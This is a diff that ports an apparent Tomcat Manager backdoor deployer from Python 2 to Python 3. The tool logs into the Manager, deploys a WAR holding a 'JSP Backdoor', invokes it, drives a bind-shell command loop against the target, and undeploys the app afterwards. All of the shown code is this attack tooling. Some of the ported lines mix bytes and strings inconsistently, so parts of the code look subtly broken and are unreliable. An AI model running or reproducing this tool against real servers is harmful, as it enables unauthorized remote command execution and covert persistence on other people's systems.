@@ -33,7 +33,7 @@ import shutil
 import base64
 import socket
 import urllib
-import urllib2
+import urllib.request
 import logging
 import optparse
 import tempfile
@@ -109,20 +109,20 @@ def issueCommand(sock, cmd, isWindows, path = ''):
     else:
         cmd = cmd + '\n'
 
-    sock.send(cmd)
+    sock.send(cmd.encode())
     res = recvall(sock).strip()
 
     if isWindows:
-        res = res.replace(cmd, '')
-        lines = res.split('\r\n')
+        res = res.replace(cmd.encode(), ''.encode())
+        lines = res.split('\r\n'.encode())
 
         if len(lines) > 2 and lines[-2].strip() == '' \
             and re.match(r'[A-Z]\:(?:\\[^>]+)>', lines[-1]):
             res = '\r\n'.join(lines[:-2])
 
-        lines = res.split('\r\n')
+        lines = res.split('\r\n'.encode())
         if lines[-1].strip() == path:
-            res = '\r\n'.join(lines[:-1]).strip()
+            res = '\r\n'.encode().join(lines[:-1]).strip()
 
     return res
 
@@ -138,8 +138,8 @@ def shellLoop(sock, host):
         except: 
             pass
 
-        if 'Microsoft Windows [Version' in initialRecv:
-            lines = initialRecv.split('\r\n')
+        if 'Microsoft Windows [Version'.encode() in initialRecv:
+            lines = initialRecv.split('\r\n'.encode())
             path = lines[-1]
             isWindows = True
 
@@ -169,7 +169,7 @@ def shellLoop(sock, host):
 
     try:
         while True:
-            command = raw_input(prompt)
+            command = input(prompt)
             if not command:
                 continue
             if command.lower() == 'exit' or command.lower() == 'quit':
@@ -203,7 +203,7 @@ def shellHandler(mode, hostn, opts):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(int(opts.timeout))
-    except socket.error, e:
+    except socket.error as e:
         logger.error("Creating socket for bind-shell client failed: '%s'" % e)
         return False
 
@@ -295,7 +295,7 @@ def generateWAR(code, title, appname):
         f.write(code)
 
     javaver = execcmd('java -version')
-    m = re.search('version "([^"]+)"', javaver, re.M|re.I)
+    m = re.search(b'version "([^"]+)"', javaver, re.M|re.I)
     if m:
         javaver = m.group(1)
         logger.debug('Working with Java at version: %s' % javaver)
@@ -597,14 +597,14 @@ def invokeApplication(browser, url, opts):
 
         resp = browser.open(appurl)
         src = resp.read()
-        if 'JSP Backdoor deployed as WAR on Apache Tomcat.' in src:
+        if 'JSP Backdoor deployed as WAR on Apache Tomcat.'.encode() in src:
             logger.debug('Application invoked correctly.')
             return True
         else:
             logger.warning('Could not correctly invoke the application!')
             return False
 
-    except urllib2.HTTPError, e:
+    except urllib.error.HTTPError as e:
         if e.code == 404:
             logger.error(
                 'Application "%s" does not exist, or was not deployed.' % opts.appname)
@@ -623,7 +623,7 @@ def deployApplication(browser, url, appname, warpath, modify_action=False, addJs
 
     resp = browser.open(url)
     for form in browser.forms():
-        action = urllib.unquote_plus(form.action)
+        action = urllib.parse.unquote_plus(form.action)
 
         action_function = ('/upload' in action)
 
@@ -678,7 +678,7 @@ def deployApplication(browser, url, appname, warpath, modify_action=False, addJs
 def removeApplication(browser, url, appname):
     browser.open(url)
     for form in browser.forms():
-        action = urllib.unquote_plus(form.action)
+        action = urllib.parse.unquote_plus(form.action)
         if url in action and '/undeploy?path=/' + appname in action:
             browser.form = form
             if INSERT_JSESSIONID:
@@ -692,8 +692,8 @@ def checkIsDeployed(browser, url, appname):
     logger.debug("Checking if app {} is deployed at: {}".format(appname, url))
     browser.open(url)
     for form in browser.forms():
-        action = urllib.unquote_plus(form.action)
-        appnameenc = urllib.quote_plus(appname)
+        action = urllib.parse.unquote_plus(form.action)
+        appnameenc = urllib.parse.quote_plus(appname)
         appundeploy = '/undeploy?path=/' + appnameenc
         precondition = url in action
         if '%252e%252e/' in url:
@@ -720,8 +720,8 @@ def unloadApplication(browser, url, appname, addJsessionId = False):
     logger.debug('Unloading application: "%s"' % appurl)
     browser.open(MANAGER_URL)
     for form in browser.forms():
-        action = urllib.unquote_plus(form.action)
-        appnameenc = urllib.quote_plus(appname)
+        action = urllib.parse.unquote_plus(form.action)
+        appnameenc = urllib.parse.quote_plus(appname)
         appundeploy = '/undeploy?path=/' + appnameenc
 
         precondition = url in action
@@ -744,13 +744,13 @@ def unloadApplication(browser, url, appname, addJsessionId = False):
             if addJsessionId:
                 try:
                     resp = browser.submit()
-                except urllib2.HTTPError, e:
+                except urllib.error.HTTPError as e:
                     logger.error('Unloading application failed with code: {}. Try changing appname with "--name" option to overcome this problem.'.format(e.code))
                     sys.exit(0)
             else:
                 try:
                     resp = browser.submit()
-                except urllib2.HTTPError, e:
+                except urllib.error.HTTPError as e:
                     if e.code == 403 and not addJsessionId:
                         for c in COOKIE_JAR:
                             if c.name.lower() == 'jsessionid':
@@ -761,9 +761,9 @@ def unloadApplication(browser, url, appname, addJsessionId = False):
 
             try:
                 resp = browser.open(appurl)
-            except urllib2.URLError as e:
+            except urllib.error.URLError as e:
                 return True
-            except urllib2.HTTPError as e:
+            except urllib.error.HTTPError as e:
                 if e.code == 404:
                     return True
 
@@ -775,7 +775,7 @@ def validateManagerApplication(browser):
                'upload', 'expire', 'reload')
     for form in browser.forms():
         for a in actions:
-            action = urllib.unquote_plus(form.action)
+            action = urllib.parse.unquote_plus(form.action)
             if '/' + a + '?' in action or '/' + a + ';' in action:
                 found += 1
 
@@ -785,7 +785,7 @@ def validateManagerApplication(browser):
     # Maybe dealing with Tomcat/5.x which had links in <A> ?
     for link in browser.links():
         for a in actions:
-            action = urllib.unquote_plus(str(link))
+            action = urllib.parse.unquote_plus(str(link))
             if '/' + a + '?' in action or '/' + a + ';' in action:
                 found += 1
 
@@ -860,7 +860,7 @@ def browseToManager(host, url, user, password):
             page = browser.open(managerurl)
 
             data = page.read()
-            m = re.search('Apache Tomcat/([^<]+)', data)
+            m = re.search(b'Apache Tomcat/([^<]+)', data)
             if m:
                 logger.debug('Probably found something: Apache Tomcat/%s' % m.group(1))
                 tomcatVersion = m.group(1)
@@ -875,7 +875,7 @@ def browseToManager(host, url, user, password):
                 reached = True
                 break
 
-        except urllib2.URLError, e:
+        except urllib.error.URLError as e:
             error = str(e)
             if 'Connection refused' in error:
                 logger.warning(
@@ -1075,7 +1075,7 @@ def main():
             try:
                 browser, url = browseToManager(
                     args[0], opts.url, opts.user, opts.password)
-		if browser == 403 and url == 403:
+                if browser == 403 and url == 403:
                     browser = url = None
 
             except KeyboardInterrupt:
